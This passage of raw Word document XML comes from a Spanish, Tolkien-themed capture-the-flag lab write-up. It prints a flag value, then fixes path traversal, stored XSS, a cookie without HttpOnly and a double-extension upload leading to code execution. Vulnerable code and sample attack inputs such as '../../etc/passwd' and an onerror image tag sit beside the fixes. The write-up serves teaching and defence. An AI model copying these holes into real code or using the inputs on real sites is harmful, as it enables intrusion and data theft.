        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG{0N3_R1NG_T0_RUL3_TH3M_4LL_k8m2x9}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué funciona:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> el formulario de subida valida </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>solo la última extensión</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.htaccess</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>AddHandler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hace que Apache ejecute como PHP cualquier fichero con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el nombre.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PARTE B — Correcciones del código</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Aquí explicamos, para cada fallo, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>qué estaba mal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>el código corregido</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>por qué ya no se puede explotar</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>B.1 — Ficheros sensibles expuestos (Flags 1, 2 e `init.sql`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Qué estaba mal:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>secret/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dev/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>init.sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> estaban dentro de la web, sin protección. Cualquiera con la URL los leía.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Corrección — proteger esas rutas con un `.htaccess`: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# /secret/.htaccess  y  /dev/.htaccess</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Require all denied</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Y el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>init.sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> debe vivir </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>fuera</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> de la carpeta pública (p. ej. en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/opt/deploy/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">), no en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>html/</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué ya no se puede explotar:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> aunque alguien escriba </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/secret/ring.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, Apache responde </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>403</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> antes de abrir el fichero, y el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>init.sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ya ni existe dentro de la web. No hay nada que leer.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B.2 — Path Traversal en `library.php` (ya corregido)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Qué estaba mal (versión antigua):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> se concatenaba la entrada del usuario directamente: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$path = "texts/" . $_GET['file'];          // ?file=../../etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo file_get_contents($path);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Código corregido (el que tiene ahora):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$file = basename($raw_file);                         // quita los ../</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if (pathinfo($file, PATHINFO_EXTENSION) !== 'txt') { // solo .txt</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "Error: Solo se permite leer pergaminos de texto (.txt).";</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>} else {</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    $path = "texts/" . $file;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (file_exists($path)) echo htmlspecialchars(file_get_contents($path));</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué ya no se puede explotar:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>basename()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> elimina los </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, así que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>../../etc/passwd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> se queda en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, que no existe en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>texts/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Y solo se abren ficheros </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.txt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B.3 — Stored XSS en el Muro (Flag 3, parte 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Qué estaba mal:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> el muro imprimía los mensajes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sin escaparlos</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, y el único filtro bloqueaba la cadena </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;script</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (fácil de saltar con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). Además, el campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>author</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> no se filtraba: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if (preg_match("/&lt;script/i", $message)) { $error = "..."; }   // filtro inútil</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>// ...</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>&lt;div class="author"&gt;&lt;?php echo $msg['author']; ?&gt;&lt;/div&gt;       // sin escapar</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>&lt;div class="text"&gt;&lt;?php echo $msg['message']; ?&gt;&lt;/div&gt;        // sin escapar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Código corregido — escapar la salida con `htmlspecialchars()`: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&lt;div class="author"&gt;&lt;?php echo htmlspecialchars($msg['author']); ?&gt;&lt;/div&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>&lt;div class="text"&gt;&lt;?php echo htmlspecialchars($msg['message']); ?&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Y quitamos el filtro de lista negra, que no sirve de nada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué ya no se puede explotar:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;img src=x onerror=...&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> se guarda igual, pero al mostrarlo se convierte en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&amp;lt;img...&amp;gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: el navegador lo pinta como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>texto</w:t>
      </w:r>
      <w:r>
        <w:t>, no lo ejecuta.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B.4 — Cookie de sesión sin `HttpOnly` (Flag 3, parte 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Qué estaba mal:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> el login desactivaba </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a propósito, así que el JavaScript (y por tanto el XSS) podía leer la cookie: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ini_set('session.cookie_httponly', 0);   // la cookie queda expuesta a JS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Código corregido — activar `HttpOnly`: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session_set_cookie_params([</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    'httponly' =&gt; true,     // JS ya no puede leer la cookie</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>]);</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>session_name("lotrCookie");</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>session_start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué ya no se puede explotar:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sale vacío. Aunque hubiera un XSS, no podría leer la cookie de sesión, así que el robo (que es lo que daba la flag) deja de funcionar.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B.5 — Subida arbitraria de ficheros → RCE (Flag 4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Qué estaba mal:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> solo se validaba la última extensión y se guardaba con el nombre original; además, un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.htaccess</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hacía ejecutar los </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.php</w:t>
      </w:r>
      <w:r>
        <w:t>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$ext = pathinfo($filename, PATHINFO_EXTENSION);   // solo la ÚLTIMA extensión</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if ($ext !== 'jpg') { error; }</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>move_uploaded_file($tmp, $upload_dir . $filename); // nombre original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# private/uploads/.htaccess</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>AddHandler application/x-httpd-php .php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Código corregido — comprobar que es una imagen de verdad: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$info = getimagesize($_FILES['map']['tmp_name']);   // ¿es imagen de verdad?</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if ($info === false || $info['mime'] !== 'image/jpeg') {</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    die("El fichero no es una imagen JPEG válida.");</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Y que en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>uploads/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>no se ejecute PHP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (quitamos el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>AddHandler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y lo apagamos):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="1E1E1E"/>
        <w:spacing w:before="80" w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># private/uploads/.htaccess</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>php_flag engine off</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué ya no se puede explotar:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.php.jpg</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con código PHP dentro ya no pasa (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>getimagesize()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> lo rechaza) y, aunque se colara, en esa carpeta no se ejecuta PHP. El truco de la doble extensión muere.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Vulnerabilidad</w:t>
            </w:r>
          </w:p>
          <w:shd w:val="clear" w:fill="EFE3CF"/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Fichero</w:t>
            </w:r>
          </w:p>
          <w:shd w:val="clear" w:fill="EFE3CF"/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Corrección en una línea</w:t>
            </w:r>
          </w:p>
          <w:shd w:val="clear" w:fill="EFE3CF"/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Ficheros sensibles expuestos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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>secret/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00"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>dev/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00"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>init.sql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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>.htaccess Require all denied</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> + sacar </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>init.sql</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> de la web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Path Traversal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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>library.php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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>basename()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> + solo </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>.txt</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> (ya aplicado)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Stored XSS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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>mordor/wall.php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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>htmlspecialchars()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> al mostrar los mensajes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Cookie robable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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>login.php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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>httponly =&gt; true</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> en la cookie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Subida → RCE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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>upload_map.php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00"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>uploads/.htaccess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comprobar que es imagen + no ejecutar PHP en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>uploads/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>La idea de fondo de toda la máquina:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> no fiarse de lo que mete el usuario, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>escapar siempre lo que se muestra</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>validar por contenido</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (no por el nombre del fichero) y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>no dejar en la web lo que no es web</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="CCCCCC"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">*Entorno: Apache/2.4.68 (Debian), PHP, MySQL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mordor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Proceso web: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>www-data</w:t>
